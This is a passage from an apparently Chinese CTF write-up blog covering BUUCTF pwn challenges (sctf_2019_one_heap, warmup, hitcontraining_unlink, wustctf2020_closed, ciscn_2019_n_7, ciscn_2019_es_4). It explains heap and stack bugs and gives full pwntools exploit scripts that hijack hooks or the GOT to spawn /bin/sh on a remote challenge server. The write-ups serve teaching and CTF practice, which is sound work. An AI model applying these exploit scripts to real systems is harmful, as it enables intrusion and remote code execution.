class="hljs-number">0x40</span> + p64(<span class="hljs-number">0x8</span>) + p64(free_got))<br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Content : &quot;</span>)<br>free = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-built_in">hex</span>(free))<br>libc=LibcSearcher(<span class="hljs-string">&quot;free&quot;</span>,free)<br>sys=libc.dump(<span class="hljs-string">&quot;system&quot;</span>)+free-libc.dump(<span class="hljs-string">&quot;free&quot;</span>)<br>edit(<span class="hljs-number">2</span>,p64(sys))<br>free(<span class="hljs-number">3</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h3 id="六十二、sctf-2019-one-heap"><a href="#六十二、sctf-2019-one-heap" class="headerlink" title="六十二、sctf_2019_one_heap"></a>六十二、sctf_2019_one_heap</h3><p><img src="/2021/04/07/2021-04-07-buu03/image-20210830160009616.png"><span class="image-caption">image-20210830160009616</span></p>
<p>checksec一下，64位，保护全开</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210830163315917.png"><span class="image-caption">image-20210830163315917</span></p>
<p>进入IDA，堆的菜单只有两种功能，申请和释放</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210830163404930.png"><span class="image-caption">image-20210830163404930</span></p>
<p>申请的堆块不能大于0x7f，并且申请和释放都有次数限制（其中能申请0xf次，释放4次）。而且，堆块我们只能访问到当前申请出的堆块</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210830163542538.png"><span class="image-caption">image-20210830163542538</span></p>
<p>释放堆块时，指针没有置0</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210830185924091.png"><span class="image-caption">image-20210830185924091</span></p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210830200649131-1630325227529.png"><span class="image-caption">image-20210830200649131</span></p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210830201741615.png"><span class="image-caption">image-20210830201741615</span></p>
<p>连续释放两次大小为0x70的堆块，进入到tcache bin 中，然后根据一个字节未知进行爆破，使得堆块分配tcache_perthread_struct（就是开头0x250的那个堆块）上</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210830203528418.png"><span class="image-caption">image-20210830203528418</span></p>
<p>把数值改为7，然后再把这个堆块释放，将会进入到unsorted bin中</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210830210232915.png"><span class="image-caption">image-20210830210232915</span></p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210830210216419.png"><span class="image-caption">image-20210830210216419</span></p>
<p>fd，bk已经指向了libc中某个地址了，所以后面还是爆破一个字节，去让stdout吐出libc地址。然后因为tcache结构被改动很大，要先修复一下</p>
<p>后面其实就没有什么了，就是申请出堆块，因为我们把tcache_perthread_struct释放了，所以申请出的堆块都在上面，那么可以通过这个来填写出目标地址，然后就会进入到tcache bin中，接着再申请就能任意地址写。这边还要注意的就是还要用realloc调整一下rsp</p>
<p>然后这边说下，不知道是不是运气问题，爆破上千次都没打通</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./sctf_2019_one_heap&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/ld-2.27.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&quot;node4.buuoj.cn&quot;,28247)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Input the size:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;Input the content:&quot;</span>)<br>	p.sendline(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>():</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rsp &amp; 0xf == 0</span><br><span class="hljs-string">  rcx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x40] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">first,second</span>):</span><br>	add(<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>	free()<br>	free()<br>	add(<span class="hljs-number">0x70</span>,p16((first &lt;&lt; <span class="hljs-number">8</span>) | <span class="hljs-number">0x10</span>))<br>	add(<span class="hljs-number">0x70</span>,p8(<span class="hljs-number">0x10</span>))<br>	add(<span class="hljs-number">0x70</span>,p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">0x07000000</span>))<br>	free()<br>	add(<span class="hljs-number">0x40</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span>)<br>	add(<span class="hljs-number">0x10</span>,p64(<span class="hljs-number">0</span>) + p16((second &lt;&lt; <span class="hljs-number">8</span>) | <span class="hljs-number">0x60</span>))<br>	add(<span class="hljs-number">0x40</span>,p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>	p.recv(<span class="hljs-number">8</span>)<br>	leak_addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>	log.success(<span class="hljs-string">&quot;leak_addr==&gt;0x%x&quot;</span> %leak_addr)<br>	libc_base = leak_addr - <span class="hljs-number">0x3ed8b0</span><br>	ogg = libc_base + <span class="hljs-number">0x10a38c</span><br>	realloc_hook = libc_base + libc.sym[<span class="hljs-string">&quot;__realloc_hook&quot;</span>]<br>	realloc = libc_base + libc.sym[<span class="hljs-string">&quot;realloc&quot;</span>]<br>	log.success(<span class="hljs-string">&quot;realloc==&gt;0x%x&quot;</span> %realloc)<br>	log.success(<span class="hljs-string">&quot;one_gadget==&gt;0x%x&quot;</span> %ogg)<br>	add(<span class="hljs-number">0x10</span>,p64(<span class="hljs-number">0</span>) + p64(realloc_hook))<br>	add(<span class="hljs-number">0x40</span>,p64(ogg) + p64(realloc + <span class="hljs-number">0x4</span>))<br>	add(<span class="hljs-number">0x10</span>)<br><br>	<span class="hljs-keyword">try</span>:<br>		p.sendline(<span class="hljs-string">&quot;id&quot;</span>)<br>		p.recvline_contains(<span class="hljs-string">&quot;uid&quot;</span>, timeout=<span class="hljs-number">2</span>)<br>		p.sendline(<span class="hljs-string">&quot;cat flag&quot;</span>)<br>		p.interactive()<br>	<span class="hljs-keyword">except</span>:<br>		<span class="hljs-keyword">try</span>:<br>			p.close()<br>		<span class="hljs-keyword">except</span>:<br>			<span class="hljs-keyword">pass</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>	n = <span class="hljs-number">0x1000</span><br>	<span class="hljs-keyword">while</span> n &gt; <span class="hljs-number">0</span>:<br>		log.success(<span class="hljs-string">&quot;counts: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0x1000</span> - n))<br>		<span class="hljs-keyword">try</span>:<br>			pwn(<span class="hljs-number">0x60</span>,<span class="hljs-number">0x67</span>)<br>		<span class="hljs-keyword">except</span>:<br>			<span class="hljs-keyword">pass</span><br>		<span class="hljs-comment">#p = process(argv=[ld.path,elf.path],env=&#123;&quot;LD_PRELOAD&quot; : libc.path&#125;)</span><br>		p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28247</span>)<br>		n -= <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>







<h3 id="六十三、warmup"><a href="#六十三、warmup" class="headerlink" title="六十三、warmup"></a>六十三、warmup</h3><p><img src="/2021/04/07/2021-04-07-buu03/image-20210831104431370.png"><span class="image-caption">image-20210831104431370</span></p>
<p>常规checksec一下，32位，只开了NX</p>
<p>进入IDA，发现函数很少，而且都是调用系统调用号执行函数的。所以肯定是要执行到0xB的execve函数来getshell</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210831104803643.png"><span class="image-caption">image-20210831104803643</span></p>
<p>首先，要先制造出/bin/sh\x00才行，所以先跳转到read上去，往.bss段上写/bin/sh\x00。仔细看，这边传递的read的参数，都是来自于栈上的，而且都是esp前面的地址存的值，所以其实我们就是按照平常的写法，返回地址覆盖为这里的地址，然后再写一个新的返回地址，后面跟上read的三个参数<code>payload = &#39;a&#39;*0x20+p32(read)+p32(start)+p32(0)+p32(bss)+p32(8)</code></p>
<p>然后返回到最初再次执行，因为执行完函数的返回值是存在eax中的，所以为了达成0xb，第二次执行read函数时，要输入0xb个数据，因为execve(/bin/sh,0,0)，所以我们第二次的返回地址要直接返回到read函数传参（此时eax已经是0xb了，不能再执行0x804811D，不然eax的值将会被修改），因为执行完ret后，esp会加4，移动到我们溢出的p32(0)，然后传参才会把/bin/sh地址传入到ebx中，而0x8048212这个地址，在于这个地址上的值必须是0，满足这个要求即可，这样才能满足后续传入的是两个0</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210831104312190.png"><span class="image-caption">image-20210831104312190</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = remote(&quot;node4.buuoj.cn&quot;,25785)</span><br>p = process(<span class="hljs-string">&quot;./warmup&quot;</span>)<br>bss = <span class="hljs-number">0x80491bc</span><br>start = <span class="hljs-number">0x080480D8</span><br>read = <span class="hljs-number">0x0804811D</span><br>gdb.attach(p)<br>p.recvuntil(<span class="hljs-string">&#x27;2016!&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p32(read)+p32(start)+p32(<span class="hljs-number">0</span>)+p32(bss)+p32(<span class="hljs-number">8</span>)<br>p.send(payload)<br>p.send(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p32(read)+p32(<span class="hljs-number">0x08048122</span>)+p32(<span class="hljs-number">0</span>)+p32(bss)+p32(<span class="hljs-number">0x8048212</span>)<br>p.send(payload)<br>p.send(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span> + <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">3</span>  )<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h3 id="六十四、hitcontraining-unlink"><a href="#六十四、hitcontraining-unlink" class="headerlink" title="六十四、hitcontraining_unlink"></a>六十四、hitcontraining_unlink</h3><p><img src="/2021/04/07/2021-04-07-buu03/image-20210831153526197.png"><span class="image-caption">image-20210831153526197</span></p>
<p>常规checksec一下，64位，开了NX，Canary</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210831154605863.png"><span class="image-caption">image-20210831154605863</span></p>
<p>进入IDA，四个菜单功能都具备，同时还找到个后门函数，但是看路径，应该是用不了的，buu的flag就在根目录下的</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210831155631822.png"><span class="image-caption">image-20210831155631822</span></p>
<p>漏洞点在于修改函数里面，对于修改的size没有检查，存在堆溢出</p>
<p>由于在输入后会加0截断，并且没开PIE，堆指针简单可寻，所以这题用unlink做。目标是劫持atoi的got，</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210831202645476.png"><span class="image-caption">image-20210831202645476</span></p>
<p>这里是触发了unlink，下一个大小为0x80的堆块与我们伪造的大小为0x40的堆块合并放入unsorted bin 中</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210831203042925.png"><span class="image-caption">image-20210831203042925</span></p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210831203937694.png"><span class="image-caption">image-20210831203937694</span></p>
<p>同时，指向chunk0的指针保存的地址换为了ptr - 0x18的值，所以，此时可以认为chunk0变成是在ptr - 0x18的地方了。所以此时再把堆指针改为函数got表地址，从而泄露libc地址</p>
<p>而刚好，此时又是atoi的got表地址，所以直接继续往里面写入system的地址即可，最后再输入/bin/sh\x00即可</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210831204445381.png"><span class="image-caption">image-20210831204445381</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./1&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25062</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;length of item name:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;the name of item:&quot;</span>)<br>	p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index of item:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;length of item name:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>	p.recvuntil(<span class="hljs-string">&quot;the new name of the item:&quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>():</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;the index of item:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>atoi_got = elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br>ptr = <span class="hljs-number">0x00000000006020C8</span><br>add(<span class="hljs-number">0x40</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;b&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;c&#x27;</span>)<br>fake_chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x41</span>) <span class="hljs-comment">#fake_chunk header</span><br>fake_chunk += p64(ptr - <span class="hljs-number">0x18</span>) + p64(ptr - <span class="hljs-number">0x10</span>) <span class="hljs-comment">#fake_chunk fd  bk</span><br>fake_chunk += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0x40</span>) + p64(<span class="hljs-number">0x90</span>) <span class="hljs-comment">#fake prev_size size</span><br>edit(<span class="hljs-number">0</span>,fake_chunk)<br>free(<span class="hljs-number">1</span>)<br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0x40</span>) + p64(atoi_got)<br>edit(<span class="hljs-number">0</span>,payload)<br>show()<br>p.recvuntil(<span class="hljs-string">&#x27;0 : &#x27;</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br>log.success(<span class="hljs-built_in">hex</span>(libc_base))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] <br>log.success(<span class="hljs-built_in">hex</span>(system))<br>edit(<span class="hljs-number">0</span>,p64(system))<br>p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="六十五、wustctf2020-closed"><a href="#六十五、wustctf2020-closed" class="headerlink" title="六十五、wustctf2020_closed"></a>六十五、wustctf2020_closed</h3><p>这题比较有意思，记录一下，考的是linux的基础知识</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210902152712612.png"><span class="image-caption">image-20210902152712612</span></p>
<p>进入IDA，程序十分简单，甚至主函数已经运行了system(“/bin/sh”)了，但是注意这边执行了close(1)以及close(2)。这代表什么？代表关闭了linux里面的标准输出(1)和标准错误(2)，所以即使已经getshell了，但是我们是看不到输出的，所以这时候输入<code>exec 1&gt;&amp;0</code>就可以让标准输出的文件描述符重定向为0，而0没被关闭，才能看到输出</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210902152420434.png"><span class="image-caption">image-20210902152420434</span></p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210902152447680.png"><span class="image-caption">image-20210902152447680</span></p>
<h3 id="六十六、ciscn-2019-n-7"><a href="#六十六、ciscn-2019-n-7" class="headerlink" title="六十六、ciscn_2019_n_7"></a>六十六、ciscn_2019_n_7</h3><p><img src="/2021/04/07/2021-04-07-buu03/image-20210904105152457.png"><span class="image-caption">image-20210904105152457</span></p>
<p>常规checksec一下，64位，保护全开</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210904111520818.png"><span class="image-caption">image-20210904111520818</span></p>
<p>进入IDA，分析程序，首先程序不存在释放功能，并且堆块只能生成一次，这直接断绝了劫持hook指针的做法</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210904111633970.png"><span class="image-caption">image-20210904111633970</span></p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210904111749218.png"><span class="image-caption">image-20210904111749218</span></p>
<p>在add，edit函数中，我们可以直接修改程序中的堆块指针，也就是说，我们拥有了任意写的能力</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210904111836132.png"><span class="image-caption">image-20210904111836132</span></p>
<p>其次在输入666后，程序会打印出puts的地址，也就是也拥有了libc地址，似乎一切都具备了？就差一个可以让我们直接写入one_gadget的地方。写在哪？这里介绍一个新的hook，exit_hook，在执行exit函数时，会执行到两个函数，分别是<code>_dl_rtld_lock_recursive</code>和<code>_dl_rtld_unlock_recursive</code>，其中一个劫持为one_gadget都行，并且这两个的偏移是固定的值</p>
<p>libc-2.23.so:</p>
<ul>
<li>rtld_lock = libc_base + 0x5F0F48</li>
<li>rtld_unlock = libc_base + 0x5F0F50</li>
</ul>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210904113624683.png"><span class="image-caption">image-20210904113624683</span></p>
<p>刚好很巧，这边执行到exit时，也是把文件描述符1和2关闭了，看不见输出，所以跟上题一样的处理方式，<code>exec 1&gt;&amp;0</code>才能看到交互</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210904113504655.png"><span class="image-caption">image-20210904113504655</span></p>
<p>成功getshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./ciscn_2019_n_7&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28496</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice-&gt;&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Input string Length:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;name:&quot;</span>)<br>	p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">name,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice-&gt;&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;New Author name:&quot;</span>)<br>	p.send(name)<br>	p.recvuntil(<span class="hljs-string">&quot;contents:&quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>():</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice-&gt;&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exit</span>():</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice-&gt;&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice-&gt;&quot;</span>,<span class="hljs-string">&quot;666&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>log.success(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>ogg = libc_base + <span class="hljs-number">0xf1147</span><br>rtld_lock = libc_base + <span class="hljs-number">0x5F0F48</span><br>add(<span class="hljs-number">0x60</span>,p64(rtld_lock) * <span class="hljs-number">2</span>)<br>edit(p64(rtld_lock) * <span class="hljs-number">2</span>,p64(ogg))<br>exit()<br>p.sendline(<span class="hljs-string">&quot;exec 1&gt;&amp;0&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;ls&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h3 id="六十八、ciscn-2019-es-4"><a href="#六十八、ciscn-2019-es-4" class="headerlink" title="六十八、ciscn_2019_es_4"></a>六十八、ciscn_2019_es_4</h3><p><img src="/2021/04/07/2021-04-07-buu03/image-20210904121810292.png"><span class="image-caption">image-20210904121810292</span></p>
<p>checksec一下，64位，PIE没开</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210904221627524.png"><span class="image-caption">image-20210904221627524</span></p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210904221644339.png"><span class="image-caption">image-20210904221644339</span></p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210904221657542.png"><span class="image-caption">image-20210904221657542</span></p>
<p>首先漏洞点存在edit函数里面，offbynull，其次edit和show函数，都存在验证次数问题，并且验证的值保存在.bss上，没开PIE，也就是说，应该是unlink的题，把chunk改到.bss上，然后修改key值。然后版本是libc-2.27.so，存在tcache，所以在假chunk底下那个chunk要释放七个相同大小去填充tcache bin</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210904230122725.png"><span class="image-caption">image-20210904230122725</span></p>
<p>unlink成功，把chunk的指针设为.bss上的值</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210904231117920.png"><span class="image-caption">image-20210904231117920</span></p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210904231321497.png"><span class="image-caption">image-20210904231321497</span></p>
<p>通过unlink设置的指针，把前面两个修改为同一个堆地址，借此造成double free，然后把堆块分配到key上，修改key值，让show功能恢复使用，然后通过show功能泄露libc地址。然后再次使用unlink设置好的指针，把前面的堆块指针改为指向free_hook，然后通过edit函数，往里面写入system函数，之后free一个写有/bin/sh的堆块即可</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210904234122710.png"><span class="image-caption">image-20210904234122710</span></p>
<p>然后，远程打时，堆块地址是只有图中那么长的，要注意一下。然后就是我们最后往free_hook写入system的那个堆块，必须要在这之前是被申请出来的，具体原因我也不知道为什么，我做的时候一直卡在这最后一步，没想通，然后是对照别人wp才改了这个点，然后通了</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210905095712141.png"><span class="image-caption">image-20210905095712141</span></p>
<p>getshell！</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./ciscn_2019_es_4&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29483</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;4.show\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span 